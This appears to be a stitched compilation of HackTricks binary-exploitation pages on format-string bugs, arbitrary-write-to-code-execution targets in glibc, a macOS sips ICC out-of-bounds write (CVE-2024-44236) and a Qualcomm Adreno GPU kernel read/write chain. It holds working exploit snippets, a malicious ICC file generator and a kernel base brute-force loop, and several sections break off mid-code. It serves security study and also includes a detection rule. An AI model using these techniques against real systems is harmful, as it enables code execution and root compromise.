title: HT: Basic Information (README)
text: ## Basic Information In C **`printf`** is a function that can be used to **print** some string. The **first parameter** this function expects is the **raw text with the formatters**. The **following parameters** expected are the **values** to **substitute** the **formatters** from the raw text. Other vulnerable functions are **`sprintf()`** and **`fprintf()`**. The vulnerability appears when an **attacker text is used as the first argument** to this function. The attacker will be able to craft a **special input abusing** the **printf format** string capabilities to read and **write any data in any address (readable/writable)**. Being able this way to **execute arbitrary code**.<sup>[[1]](#references)</sup> #### Formatters: ```bash %08x —> 8 hex bytes %d —> Entire %u —> Unsigned %s —> String %p —> Pointer %n —> Number of written bytes %hn —> Occupies 2 bytes instead of 4 <n>$X —> Direct access, Example: ("%3$d", var1, var2, var3) —> Access to var3 ``` **Examples:** - Vulnerable example: ```c char buffer[30]; gets(buffer); // Dangerous: takes user input without restrictions. printf(buffer); // If buffer contains "%x", it reads from the stack. ``` - Normal Use: ```c int value = 1205; printf("%x %x %x", value, value, value); // Outputs: 4b5 4b5 4b5 ``` - With Missing Arguments: ```c printf("%x %x %x", value); // Unexpected output: reads random values from the stack. ``` - fprintf vulnerable: ```c #include <stdio.h> int main(int argc, char *argv[]) { char *user_input; user_input = argv[1]; FILE *output_file = fopen("output.txt", "w"); fprintf(output_file, user_input); // The user input can include formatters! fclose(output_file); return 0; } ``` ### **Accessing Pointers** The format **`%<n>$x`**, where `n` is a number, allows to indicate to printf to select the n parameter (

text: ## **Arbitrary Write** The formatter **`%<num>$n`** **writes** the **number of written bytes** in the **indicated address** in the <num> param in the stack. text: ## Format Strings to BOF It's possible to abuse the write actions of a format string vulnerability to **write in addresses of the stack** and exploit a **buffer overflow** type of vulnerability.

title: HT: Windows x64: Format-string leak to bypass ASLR (no varargs) (README)
text: ## Windows x64: Format-string leak to bypass ASLR (no varargs) On Windows x64 the first four integer/pointer parameters are passed in registers: RCX, RDX, R8, R9. In many buggy call-sites the attacker-controlled string is used as the format argument but no variadic arguments are provided, for example: ```c // keyData is fully controlled by the client // _snprintf(dst, len, fmt, ...) _snprintf(keyStringBuffer, 0xff2, (char*)keyData); ``` Because no varargs are passed, any conversion like "%p", "%x", "%s" will cause the CRT to read the next variadic argument from the appropriate register. With the Microsoft x64 calling convention the first such read for "%p" comes from R9. Whatever transient value is in R9 at the call-site will be printed. In practice this often leaks a stable in-module pointer (e.g., a pointer to a local/global object previously placed in R9 by surrounding code or a callee-saved value), which can be used to recover the module base and defeat ASLR.<sup>[[7]](#references)[[8]](#references)</sup> Practical workflow: - Inject a harmless format such as "%p " at the very start of the attacker-controlled string so the first conversion executes before any filtering. - Capture the leaked pointer, identify the static offset of that object inside the module (by reversing once with symbols or a local copy), and recover the image base as `leak - known_offset`. - Reuse that base to compute absolute addresses for ROP gadgets and IAT entries remotely. Example (abbreviated python): ```python from pwn import remote

title: HT: Read Binary Start (format-strings-arbitrary-read-example)
text: ## Read Binary Start ### Code ```c #include int main(void) { char buffer[30]; fgets(buffer, sizeof(buffer), stdin); printf(buffer); return 0; } ``` Compile it with: ```bash clang -o fs-read fs-read.c -Wno-format-security -no-pie ``` ### Exploit ```python from pwn import * p = process('./fs-read') payload = f"%11$s|||||".encode() payload += p64(0x00400000) p.sendline(payload) log.info(p.clean()) ``` - The **offset is 11 for this build** because setting several As and **brute-forcing** offsets from 0 to 50 found that offset 11, with 5 extra characters (pipes `|` here), controls a full address. Recalculate it after changing the compiler, architecture, or surrounding call site.[[1]](#references)[[4]](#references) - I used **`%11$p`** with padding until I saw that the address was all `0x4141414141414141` - The **format string payload is BEFORE the address** because the **printf stops reading at a null byte**, so if we send the address and then the format string, the printf will never reach the format string as a null byte will be found before - The address selected is 0x00400000 because it's where the binary starts (no PIE)

Its callback is invoked **many times**; for the single-call binary in **Read Binary Start**, create a new process for each probe. `FmtStr` searches for a cyclic marker in leaked stack arguments and returns both `offset` and `padlen`.[[4]](#references) ```python from pwn import * context.binary = elf = ELF('./fs-read', checksec=False) def exec_fmt(payload): io = process(elf.path) io.sendline(payload) return io.recvall(timeout=0.2) autofmt = FmtStr(execute_fmt=exec_fmt) log.success(f"offset={autofmt.offset}, padlen={autofmt.padlen}") ``` The positional index normally remains stable across ASLR runs because ASLR changes addresses, not the number of variadic slots before the input. title: HT: .dtors (www2exec-.dtors-and-.fini_array)
text: ## .dtors > [!CAUTION] > The legacy `.dtors` section is uncommon in modern ELF binaries; contemporary toolchains use `.fini_array`. Destructor functions run during normal process termination, such as after `main` returns or code calls `exit`; `_exit`, a fatal signal, or an abrupt crash bypasses normal finalization. In legacy binaries, function pointers live in `.dtors`. If an arbitrary write can replace the terminating marker at `__DTOR_END__` with an executable address, the termination path may call it.<sup>[[2]](#references)</sup> Get the address of this section with: ```bash objdump -s -j .dtors /exec rabin -s /exec | grep “__DTOR” ``` On 32-bit examples, the `.dtors` list is commonly bounded by `0xffffffff` and `0x00000000`. Seeing only those markers means no destructor is registered. Overwriting the null terminator with the shellcode address inserts a callback. > [!WARNING] > The exploit first needs an executable location for the shellcode, or a reusable code address such as a function/ROP target.

title: HT: **.fini_array** (www2exec-.dtors-and-.fini_array)
text: ## **.fini_array** `.fini_array` is an array of function pointers invoked by the runtime during normal termination, in reverse order. It is useful when an arbitrary write can redirect a callback to shellcode or back to `main` for another exploitation round.<sup>[[2]](#references)</sup> ```bash objdump -s -j .fini_array ./greeting ./greeting: file format elf32-i386 Contents of section .fini_array: 8049934 a0850408 #Put your address in 0x8049934 ``` Each array entry is normally visited once per finalization pass, so overwriting one entry gives one direct call unless the exploit also redirects the finalization control flow. Note that entries in `.fini_array` are called in **reverse** order, so you probably wants to start writing from the last one. #### Eternal loop The cited Insomni'hack `onewrite` exploit turns **`.fini_array`** into a repeatable write loop. With at least two usable entries, it can:<sup>[[1]](#references)</sup> - Use your first write to **call the vulnerable arbitrary write function** again - Then, calculate the return address in the stack stored by **`__libc_csu_fini`** (the function that is calling all the `.fini_array` functions) and put there the **address of `__libc_csu_fini`** - This will make **`__libc_csu_fini`** call himself again executing the **`.fini_array`** functions again which will call the vulnerable WWW function 2 times: one for **arbitrary write** and another one to overwrite again the **return address of `__libc_csu_fini`** on the stack to call itself again. > [!CAUTION] > Note that with [**Full RELRO**](../common-binary-protections-and-bypasses/relro.md)**,** the section **`.fini_array`** is made **read-only**. > Modern linkers commonly place `.fini_array` in a `PT_GNU_RELRO` segment, so it becomes read-only after relocation even unde

title: HT: **Basic Information** (aw2exec-got-plt)
text: ## **Basic Information** ### **GOT: Global Offset Table** The **Global Offset Table (GOT)** is a mechanism used in dynamically linked binaries to manage the **addresses of external functions**. Since these **addresses are not known until runtime** (due to dynamic linking), the GOT provides a way to **dynamically update the addresses of these external symbols** once they are resolved. Each entry in the GOT corresponds to a symbol in the external libraries that the binary may call. When a **function is first called, its actual address is resolved by the dynamic linker and stored in the GOT**. Subsequent calls to the same function use the address stored in the GOT, thus avoiding the overhead of resolving the address again. ### **PLT: Procedure Linkage Table** The **Procedure Linkage Table (PLT)** works closely with the GOT and serves as a trampoline to handle calls to external functions. When a binary **calls an external function for the first time, control is passed to an entry in the PLT associated with that function**. This PLT entry is responsible for invoking the dynamic linker to resolve the function's address if it has not already been resolved. After the address is resolved, it is stored in the **GOT**. **Therefore,** GOT entries are used directly once the address of an external function or variable is resolved. **PLT entries are used to facilitate the initial resolution** of these addresses via the dynamic linker.

The goal of this arbitrary write is to **override a GOT entry** of a function that is going to be executed later **with** the **address** of the PLT of the **`system`** **function** for example.<sup>[[1]](#references)</sup> Ideally, you will **override** the **GOT** of a **function** that is **going t

title: HT: libc GOT entries (aw2exec-got-plt)
text: ## libc GOT entries Some libc builds expose writable relocation targets, but this is not guaranteed: libc build flags, RELRO, symbol visibility, and version all matter. Inspect the exact loaded libc and resolve its ASLR base before choosing a target. Common functions of the libc are going to call **other internal functions** whose GOT could be overwritten in order to get code execution. The referenced modern-libc notes document concrete libc GOT targets and version-specific call paths.<sup>[[3]](#references)</sup> ### **Free2system** In heap exploitation CTFs it's common to be able to control the content of chunks and at some point even overwrite the GOT table. A simple trick to get RCE if one gadgets aren't available is to overwrite the `free` GOT address to point to `system` and to write inside a chunk `"/bin/sh"`. This way when this chunk is freed, it'll execute `system("/bin/sh")`. ### **Strlen2system** Another common technique is to overwrite a writable **`strlen`** GOT entry with **`system`**. If the program later calls that entry with controlled input, passing `"/bin/sh"` can spawn a shell. In some particular libc builds, an internal `puts` path reaches `strlen`; overwriting that libc relocation can then turn `puts(user_input)` into `system(user_input)`. This call relationship is version/build-specific, so confirm it dynamically or in the target disassembly before relying on the chain.<sup>[[3]](#references)</sup>

text: ## **One Gadget** {{#ref}} ../rop-return-oriented-programing/ret2lib/one-gadget.md {{#endref}} One-gadget constraints must hold at the overwritten call site; the referenced notes show how to evaluate them.<sup>[[2]](#references)</sup>

title: HT: **Abusing GOT from Heap** (aw2exec-got-plt)
text: ## **Abusing GOT from Heap** A common way to obtain RCE from a heap vulnerability is to abuse a fastbin so it's possible to add the part of the GOT table into the fast bin, so whenever that chunk is allocated it'll be possible to **overwrite the pointer of a function, usually `free`**.\ Then, pointing `free` to `system` and freeing a chunk where was written `/bin/sh\x00` will execute a shell. The HITCON training `lab13` writeup provides a complete example.<sup>[[4]](#references)</sup>

title: HT: **Protections** (aw2exec-got-plt)
text: ## **Protections** The **Full RELRO** protection is meant to protect agains this kind of technique by resolving all the addresses of the functions when the binary is started and making the **GOT table read only** after it: {{#ref}} ../common-binary-protections-and-bypasses/relro.md {{#endref}}

title: HT: **\_\_atexit Structures** (www2exec-atexit)
text: ## **\_\_atexit Structures** > [!CAUTION] > Nowadays is very **weird to exploit this!** **`atexit()`** is a function to which **other functions are passed as parameters.** These **functions** will be **executed** when executing an **`exit()`** or the **return** of the **main**.\ If you can **modify** the **address** of any of these **functions** to point to a shellcode for example, you will **gain control** of the **process**, but this is currently more complicated.\ Currently the **addresses to the functions** to be executed are **hidden** behind several structures and finally the address to which it points are not the addresses of the functions, but are **encrypted with XOR** and displacements with a **random key**. So currently this attack vector is **not very useful at least on x86** and **x86_64**.\ The **encryption function** is **`PTR_MANGLE`**. However, the exact implementation is **architecture- and glibc-version-dependent**: the generic glibc header is a no-op, but modern arch-specific implementations exist for important targets such as **x86_64** and **aarch64**. Therefore, **do not assume** that a non-x86 target automatically has **unmangled** exit pointers; check the target build's `pointer_guard.h` / `PTR_MANGLE` macros first. You can find an in depth explanation on how this works in [https://m101.github.io/binholic/2017/05/20/notes-on-abusing-exit-handlers.html](https://m101.github.io/binholic/2017/05/20/notes-on-abusing-exit-handlers.html)<sup>[[1]](#references)</sup>

title: HT: link_map (www2exec-atexit)
text: ## link_map As explained [**in this post**](https://github.com/nobodyisnobody/docs/blob/main/code.execution.on.last.libc/README.md#2---targetting-ldso-link_map-structure), If the program exits using `return` or `exit()` it'll run `__run_exit_handlers()` which will call registered destructors.<sup>[[2]](#references)</sup> > [!CAUTION] > If the program exits via **`_exit()`** function, it'll call the **`exit` syscall** and the exit handlers will not be executed. So, to confirm `__run_exit_handlers()` is executed you can set a breakpoint on it. The important code is ([source](https://elixir.bootlin.com/glibc/glibc-2.32/source/elf/dl-fini.c#L131)):<sup>[[3]](#references)</sup> ```c ElfW(Dyn) *fini_array = map->l_info[DT_FINI_ARRAY]; if (fini_array != NULL) { ElfW(Addr) *array = (ElfW(Addr) *) (map->l_addr + fini_array->d_un.d_ptr); size_t sz = (map->l_info[DT_FINI_ARRAYSZ]->d_un.d_val / sizeof (ElfW(Addr))); while (sz-- > 0) ((fini_t) array[sz]) (); } [...] // This is the d_un structure ptype l->l_info[DT_FINI_ARRAY]->d_un type = union { Elf64_Xword d_val; // address of function that will be called, we put our onegadget here Elf64_Addr d_ptr; // offset from l->l_addr of our structure } ``` Note how `map -> l_addr + fini_array -> d_un.d_ptr` is used to **calculate** the position of the **array of functions to call**. There are a **couple of options**: - Overwrite the value of `map->l_addr` to make it point to a **fake `fini_array`** with instructions to execute arbitrary code - Overwrite `l_info[DT_FINI_ARRAY]` and `l_info[DT_FINI_ARRAYSZ]` entries (which are more or less consecutive in memory) , to make them **points to a forged `Elf64_Dyn`** structure that will make again **`array` points to a memory** zone the attacker controlled. - [**This writeup**](https://github.com/n

title: HT: TLS-Storage dtor_list overwrite in **`__run_exit_handlers`** (www2exec-atexit)
text: ## TLS-Storage dtor_list overwrite in **`__run_exit_handlers`** As [**explained here**](https://github.com/nobodyisnobody/docs/blob/main/code.execution.on.last.libc/README.md#5---code-execution-via-tls-storage-dtor_list-overwrite), if a program exits via `return` or `exit()`, it'll execute **`__run_exit_handlers()`** which will call any destructors function registered.<sup>[[6]](#references)</sup> Code from `_run_exit_handlers()`: ```c /* Call all functions registered with `atexit' and `on_exit', in the reverse of the order in which they were registered perform stdio cleanup, and terminate program execution with STATUS. */ void attribute_hidden __run_exit_handlers (int status, struct exit_function_list **listp, bool run_list_atexit, bool run_dtors) { /* First, call the TLS destructors. */ #ifndef SHARED if (&__call_tls_dtors != NULL) #endif if (run_dtors) __call_tls_dtors (); ``` Code from **`__call_tls_dtors()`**: ```c typedef void (*dtor_func) (void *); struct dtor_list //struct added { dtor_func func; void *obj; struct link_map *map; struct dtor_list *next; }; [...] /* Call the destructors. title: HT: Practical `__exit_funcs` / `initial` forgery on modern glibc (www2exec-atexit)
text: ## Practical `__exit_funcs` / `initial` forgery on modern glibc Since classic hooks such as `__free_hook` disappeared from normal modern-glibc targets, a very common follow-up to an arbitrary write is to **forge a fake `struct exit_function_list`** and then repoint **`__exit_funcs`** to it. This is basically the most practical version of abusing `__run_exit_handlers()` on recent glibc releases.<sup>[[8]](#references)</sup><sup>[[9]](#references)</sup><sup>[[10]](#references)</sup> The important points are: - `exit()` is just a wrapper around **`__run_exit_handlers(status, &__exit_funcs, true, true)`**, so corrupting `__exit_funcs` is often enough to win when the program returns from `main` or calls `exit()`. - On a lot of targets the statically allocated `initial` list already contains one `ef_cxa` entry for **`_dl_fini`**. That gives you a **known plaintext** pointer inside the exit list. - If you can leak the **mangled** `_dl_fini` pointer and also know the **real** `_dl_fini` address, you can recover the pointer-guard cookie and then mangle any function you want. For a refresher on pointer guard, check [**this page**](../common-binary-protections-and-bypasses/libc-protections.md#pointer-guard). On **x86_64**, the formulas are usually: ```python rol = lambda x, n: ((x << n) | (x >> (64 - n))) & ((1 << 64) - 1) ror = lambda x, n: ((x >> n) | (x << (64 - n))) & ((1 << 64) - 1) ptr_guard = ror(enc_dl_fini, 0x11) ^ real_dl_fini enc_target = rol(real_target ^ ptr_guard, 0x11) ``` With that, a forged exit list usually looks like: ```c struct exit_function_list { struct exit_function_list *next; size_t idx; struct exit_function fns[32]; }; // Minimal fake list next = NULL; idx = 1; fns[0].flavor = ef_cxa; fns[0].func.cxa.fn = mangled(system); fns[0].func.cxa.arg = binsh_ptr;

title: HT: Arbitrary Write to Code Execution (README)
text: # Arbitrary Write to Code Execution {{#include ../../banners/hacktricks-training.md}} A write-what-where primitive lets an attacker place a chosen value at a chosen memory address. Turning that primitive into code execution usually means overwriting data that the process will later use for control flow, such as a function pointer, an exit handler, or a writable relocation entry. The available target depends on the binary's architecture, enabled mitigations, linked libraries, and the point at which the write occurs.<sup>[[1]](#references)</sup> Before choosing a technique, determine the write's size and repeatability, identify writable addresses, and confirm which candidate target will be dereferenced after the overwrite. The pages in this section cover common targets, including the GOT/PLT, `.fini_array`, `atexit()` handlers, historical glibc hooks, and application-specific callbacks. For a guest-origin case that builds an arbitrary write through VirtualBox NAT packet handling, see [VirtualBox Slirp NAT Packet Heap Exploitation](../libc-heap/virtualbox-slirp-nat-packet-heap-exploitation.md#forging-uma_zone_t-to-hijack-pffini). {{#ref}} ../libc-heap/gnu-obstack-function-pointer-hijack.md {{#endref}} {{#ref}} ../../mobile-pentesting/android-app-pentesting/baseband-and-soc-isolation-exploitation.md {{#endref}}

These are internal symbols, not a stable glibc ABI: their presence, visibility, relative placement, and writable state must be verified against the exact target libc.<sup>[[1]](#references)</sup> 1. title: HT: AW2Exec - `sips` ICC Profile Out-of-Bounds Write (CVE-2024-44236) (aw2exec-sips-icc-profile)
text: # AW2Exec - `sips` ICC Profile Out-of-Bounds Write (CVE-2024-44236) {{#include ../../banners/hacktricks-training.md}}

title: HT: Overview (aw2exec-sips-icc-profile)
text: ## Overview An out-of-bounds write in Apple macOS **Scriptable Image Processing System** (`sips`) was analyzed in `sips-307` from macOS 15.0.1. The bug affects validation of the `offsetToCLUT` field in `lutAToBType` (`mAB `) and `lutBToAType` (`mBA `) ICC tag data. If `offsetToCLUT` equals the tag-data size, the vulnerable loop can read and conditionally replace nonzero bytes with zero for up to **16 bytes past the heap allocation**. ZDI rates CVE-2024-44236 at 7.8 and describes code execution in the current process as the worst-case impact.<sup>[[1]](#references)[[2]](#references)</sup> > Apple fixed CVE-2024-44236 in **macOS Sequoia 15.1**, released October 28, 2024.<sup>[[3]](#references)</sup> CVE-2025-24185 is a separate `sips` out-of-bounds write fixed in Sequoia 15.3, Sonoma 14.7.3, and Ventura 13.7.3; Apple's stated impact for that issue is unexpected app termination.<sup>[[4]](#references)</sup>

title: HT: Vulnerable Code (aw2exec-sips-icc-profile)
text: ## Vulnerable Code ```c // Pseudocode extracted from sub_1000194D0 in sips-307 (macOS 15.0.1) if (offsetToCLUT <= tagDataSize) { // Simplified: inspect 16 bytes starting *at* offsetToCLUT. for (uint32_t i = offsetToCLUT; i < offsetToCLUT + 16; i++) { if (should_clear(buffer[i])) buffer[i] = 0; // missing i < tagDataSize check } } ```

title: HT: Exploitation Steps (aw2exec-sips-icc-profile)
text: ## Exploitation Steps 1. **Craft a malicious `.icc` profile** * Set up a minimal ICC header (`acsp`) and add one `mAB ` (or `mBA `) tag. * Configure the tag table so the **`offsetToCLUT` equals the tag size** (`tagDataSize`). * Use a controlled test case with nonzero bytes in the adjacent heap allocation so the conditional writes can be observed. File adjacency does not imply heap adjacency; heap shaping is a separate, build-specific part of exploitation. 2. **Trigger parsing with any sips operation that touches the profile** ```bash # verification path (no output file needed) sips --verifyColor evil.icc # or implicitly when converting images that embed the profile sips -s format png payload.jpg --out out.png ``` 3. **Heap metadata corruption ➜ arbitrary write ➜ ROP** Turning a short, conditional out-of-bounds zero-write into code execution requires control of heap layout plus a suitable object or allocator target. One exploitation sketch proposes placing the tag allocation at the end of a `nano_zone` 0x1000-byte slab, corrupting adjacent slot metadata such as `meta->slot_B`, then using a subsequent free/allocation cycle to overlap a fake object and replace a C++ vtable pointer before a ROP pivot. This preserves the useful research direction, but the public ZDI material establishes only the out-of-bounds primitive and potential code-execution impact; it does not substantiate that exact allocator chain. Treat the sketch, offsets, allocator internals, and ROP details as unverified and build-specific until reproduced against the exact macOS image.<sup>[[1]](#references)</sup> ### Quick PoC generator (Python 3) ```python #!/usr/bin/env python3 import struct TAG_OFFSET = 144 # 128-byte header + count + one record TAG_SIZE = 52 header = bytearray(128) header[8:12] = b'\x04\x3

title: HT: A2B0 is the tag signature; its payload type is mAB. (aw2exec-sips-icc-profile)
text: # A2B0 is the tag signature; its payload type is mAB. table = struct.pack('>I4sII', 1, b'A2B0', TAG_OFFSET, TAG_SIZE) mab = bytearray(TAG_SIZE) mab[0:4] = b'mAB ' mab[8] = 3 # input channels mab[9] = 3 # output channels struct.pack_into('>I', mab, 24, TAG_SIZE) # offsetToCLUT == tag-data size profile = header + table + mab open('evil.icc', 'wb').write(profile) print('[+] Wrote evil.icc (%d bytes)' % len(profile)) ``` ### YARA detection rule ```yara rule ICC_mAB_offsetToCLUT_anomaly { meta: description = "Detect CLUT offset equal to tag length in mAB/mBA (CVE-2024-44236)" author = "HackTricks" strings: $magic = { 61 63 73 70 } // 'acsp' $mab = { 6D 41 42 20 } // 'mAB ' $mba = { 6D 42 41 20 } // 'mBA ' condition: filesize >= 144 and $magic at 36 and uint32be(128) == 1 and ( $mab at uint32be(136) or $mba at uint32be(136) ) and uint32be(uint32be(136) + 24) == uint32be(140) } ``` The header and tag layout follow the ICC profile format, but this remains a structural test generator rather than a reliable exploit: parser reachability and heap adjacency depend on the exact target build.<sup>[[5]](#references)</sup> The compact rule handles this one-tag layout only. A production parser must iterate every tag-table record with bounds and integer-overflow checks; do not rely on this rule as complete coverage.

title: HT: Impact (aw2exec-sips-icc-profile)
text: ## Impact Processing a crafted ICC profile through the vulnerable `sips` path may terminate the process and could lead to code execution in the context of that process. ICC profiles can be standalone files or embedded in formats such as PNG, JPEG, and TIFF, but reachability through Preview, Quick Look, Safari, or Mail must be tested separately. The cited advisories do not establish a Gatekeeper bypass.<sup>[[1]](#references)[[2]](#references)</sup>

title: HT: Detection & Mitigation (aw2exec-sips-icc-profile)
text: ## Detection & Mitigation * **Patch:** for Sequoia, install macOS 15.1 or later; use Apple's security-release guidance for other supported branches.<sup>[[3]](#references)</sup> * Use the limited YARA rule above for the exact proof-of-concept layout, and deploy a real ICC parser when broader inspection is required. * Strip or sanitise embedded ICC profiles with `exiftool -icc_profile= -overwrite_original <file>` before further processing on untrusted files. * Analyze unknown media in an isolated, disposable virtual machine when practical. * For DFIR, execution of `sips --verifyColor`, relevant process crashes, and unexpected `ColorSync` library loads may provide useful context, but absence of these events does not rule out another application reaching the affected parser.

title: HT: **Malloc Hook** (aw2exec-__malloc_hook)
text: ## **Malloc Hook** As you can [Official GNU site](https://www.gnu.org/software/libc/manual/html_node/Hooks-for-Malloc.html), the variable **`__malloc_hook`** is a pointer pointing to the **address of a function that will be called** whenever `malloc()` is called **stored in the data section of the libc library**. Therefore, if this address is overwritten with a **One Gadget** for example and `malloc` is called, the **One Gadget will be called**.<sup>[[1]](#references)</sup> To call malloc it's possible to wait for the program to call it or by **calling `printf("%10000$c")`** which allocates too bytes many making `libc` calling malloc to allocate them in the heap.<sup>[[2]](#references)</sup> More info about One Gadget in: {{#ref}} ../rop-return-oriented-programing/ret2lib/one-gadget.md {{#endref}} > [!WARNING] > Note that hooks are **disabled for GLIBC >= 2.34**. There are other techniques that can be used on modern GLIBC versions. See: [https://github.com/nobodyisnobody/docs/blob/main/code.execution.on.last.libc/README.md](https://github.com/nobodyisnobody/docs/blob/main/code.execution.on.last.libc/README.md).<sup>[[3]](#references)</sup>

title: HT: Tcache poisoning & Safe-Linking (glibc 2.32 – 2.33) (aw2exec-__malloc_hook)
text: ## Tcache poisoning & Safe-Linking (glibc 2.32 – 2.33) glibc 2.32 introduced **Safe-Linking** – an integrity-check that protects the *single*-linked lists used by **tcache** and fast-bins. Instead of storing a raw forward pointer (`fd`), ptmalloc now stores it *obfuscated* with the following macro:<sup>[[5]](#references)</sup> ```c #define PROTECT_PTR(pos, ptr) (((size_t)(pos) >> 12) ^ (size_t)(ptr)) #define REVEAL_PTR(ptr) PROTECT_PTR(&ptr, ptr) ``` Consequences for exploitation: 1. A **heap leak** is mandatory – the attacker must know the runtime value of `chunk_addr >> 12` to craft a valid obfuscated pointer. 2. Only the *full* 8-byte pointer can be forged; single-byte partial overwrites will not pass the check. A minimal tcache-poisoning primitive that overwrites `__free_hook` on glibc 2.32/2.33 therefore looks like: ```py from pwn import * libc = ELF("/lib/x86_64-linux-gnu/libc.so.6") p = process("./vuln")

Trigger bin_sh = malloc(0x48) edit(bin_sh, b"/bin/sh\x00") free(bin_sh) ``` The snippet above follows the same tcache-poisoning pattern used to redirect an allocation onto **`__free_hook`** and overwrite it with `system`, as demonstrated by CTF challenges such as *UIUCTF 2024 – «Rusty Pointers»* and *openECSC 2023 – «Babyheap G»*. Check the target's glibc version before reusing it: *Rusty Pointers* used glibc 2.31 without Safe-Linking, while later targets can require the pointer-mangling bypass described above.<sup>[[6]](#references)</sup><sup>[[7]](#references)</sup> ---

title: HT: What changed in glibc ≥ 2.34? (aw2exec-__malloc_hook)
text: ## What changed in glibc ≥ 2.34? Starting with **glibc 2.34 (August 2021)** the allocation hooks `__malloc_hook`, `__realloc_hook`, `__memalign_hook` and `__free_hook` were **removed from the public API and are no longer invoked by the allocator**. Compatibility symbols are still exported for legacy binaries, but overwriting them no longer influences the control-flow of `malloc()` or `free()`.<sup>[[8]](#references)</sup> Practical implication: on modern distributions (Ubuntu 22.04+, Fedora 35+, Debian 12, etc.) you must pivot to *other* hijack primitives (IO-FILE, `__run_exit_handlers`, vtable spraying, etc.) because hook overwrites will silently fail. If you still need the old behaviour for debugging, glibc ships `libc_malloc_debug.so` which can be pre-loaded to re-enable the legacy hooks – but the library is **not meant for production and may disappear in future releases**. ---

title: HT: Adreno A7xx SDS->RB privilege bypass (GPU SMMU takeover to Kernel R/W) (adreno-a7xx-sds-rb-priv-bypass-gpu-smmu-kernel-rw)
text: # Adreno A7xx SDS->RB privilege bypass (GPU SMMU takeover to Kernel R/W) {{#include ../../banners/hacktricks-training.md}} This page abstracts an in-the-wild Adreno A7xx microcode logic bug (CVE-2025-21479) into reproducible exploitation techniques: abusing IB-level masking in Set Draw State (SDS) to execute privileged GPU packets from an unprivileged app, pivoting to GPU SMMU takeover and then to a fast, stable kernel R/W via a dirty-pagetable trick.<sup>[[1]](#references)</sup> - Affected: Qualcomm Adreno A7xx GPU firmware prior to a microcode fix that changed masking of register $12 from 0x3 to 0x7. - Primitive: Execute privileged CP packets (e.g., CP_SMMU_TABLE_UPDATE) from SDS, which is user-controlled. - Outcome: Arbitrary physical/virtual kernel memory R/W, SELinux disable, root. - Prereq: Ability to create a KGSL GPU context and submit command buffers that enter SDS (normal app capability).

title: HT: Background: IB levels, SDS and the $12 mask (adreno-a7xx-sds-rb-priv-bypass-gpu-smmu-kernel-rw)
text: ## Background: IB levels, SDS and the $12 mask - The kernel maintains a ringbuffer (RB=IB0). Userspace submits IB1 via CP_INDIRECT_BUFFER, chaining to IB2/IB3. - SDS is a special command stream entered via CP_SET_DRAW_STATE: - A6xx: SDS is treated as IB3 - A7xx: SDS moved to IB4 - Microcode tracks the current IB level in register $12 and gates privileged packets so they are only accepted when the effective level corresponds to IB0 (kernel RB). - Bug: A7xx microcode kept masking $12 with 0x3 (2 bits) instead of 0x7 (3 bits). Since IB4 & 0x3 == 0, SDS was misidentified as IB0, allowing privileged packets from user-controlled SDS.<sup>[[1]](#references)</sup> Why it matters: ``` A6XX | A7XX RB & 3 == 0 | RB & 3 == 0 IB1 & 3 == 1 | IB1 & 3 == 1 IB2 & 3 == 2 | IB2 & 3 == 2 IB3 (SDS) & 3 == 3 | IB3 & 3 == 3 | IB4 (SDS) & 3 == 0 <-- misread as IB0 if mask is 0x3 ``` Microcode diff example (patch switched the mask to 0x7): ``` @@ CP_SMMU_TABLE_UPDATE - and $02, $12, 0x3 + and $02, $12, 0x7 @@ CP_FIXED_STRIDE_DRAW_TABLE - and $02, $12, 0x3 + and $02, $12, 0x7 ```

title: HT: Exploitation overview (adreno-a7xx-sds-rb-priv-bypass-gpu-smmu-kernel-rw)
text: ## Exploitation overview Goal: From SDS (misread as IB0) issue privileged CP packets to re-point the GPU SMMU to attacker-crafted page tables, then use GPU copy/write packets for arbitrary physical R/W. Finally, pivot to a fast CPU-side R/W via dirty pagetable.<sup>[[1]](#references)</sup> High-level chain - Craft a fake GPU pagetable in shared memory - Enter SDS and execute: - CP_SMMU_TABLE_UPDATE -> switch to fake pagetable - CP_MEM_WRITE / CP_MEM_TO_MEM -> implement write/read primitives - CP_SET_DRAW_STATE with run-now flags (dispatch immediately) GPU R/W primitives via fake pagetable - Write: CP_MEM_WRITE to an attacker-chosen GPU VA whose PTEs you map to a chosen PA -> arbitrary physical write - Read: CP_MEM_TO_MEM copies 4/8 bytes from target PA to a userspace-shared buffer (batch for larger reads)<sup>[[3]](#references)</sup> Notes - Each Android process gets a KGSL context (IOCTL_KGSL_GPU_CONTEXT_CREATE). Switching contexts normally updates SMMU tables in the RB; the bug lets you do it in SDS. - Excessive GPU traffic can cause UI blackouts and reboots; reads are small (4/8B) and sync is slow by default.

title: HT: Building the SDS command sequence (adreno-a7xx-sds-rb-priv-bypass-gpu-smmu-kernel-rw)
text: ## Building the SDS command sequence - Spray a fake GPU pagetable into shared memory so at least one instance lands at a known physical address (e.g., via allocator grooming and repetition). - Construct an SDS buffer containing, in order: 1) CP_SMMU_TABLE_UPDATE to the physical address of the fake pagetable 2) One or more CP_MEM_WRITE and/or CP_MEM_TO_MEM packets to implement R/W using your new translations 3) CP_SET_DRAW_STATE with flags to run-now<sup>[[1]](#references)</sup> The exact packet encodings vary by firmware; use freedreno’s afuc/packet docs to assemble the words, and ensure the SDS submission path is taken by the driver.<sup>[[2]](#references)</sup>

title: HT: Finding Samsung kernel physbase under physical KASLR (adreno-a7xx-sds-rb-priv-bypass-gpu-smmu-kernel-rw)
text: ## Finding Samsung kernel physbase under physical KASLR Samsung randomizes the kernel physical base within a known region on Snapdragon devices. Brute-force the expected range and look for the first 16 bytes of _stext.<sup>[[1]](#references)</sup> Representative loop ```c while (!ctx->kernel.pbase) { offset += 0x8000; uint64_t d1 = kernel_physread_u64(ctx, base + offset); if (d1 != 0xd10203ffd503233f) continue; // first 8 bytes of _stext uint64_t d2 = kernel_physread_u64(ctx, base + offset + 8); if (d2 == 0x910083fda9027bfd) { // second 8 bytes of _stext ctx->kernel.pbase = base + offset - 0x10000; break; } } ``` Once physbase is known, compute the kernel virtual with the linear map: ``` _stext = 0xffffffc008000000 + (Kernel Code & ~0xa8000000) ```

title: HT: Stabilizing to fast, reliable CPU-side kernel R/W (dirty pagetable) (adreno-a7xx-sds-rb-priv-bypass-gpu-smmu-kernel-rw)
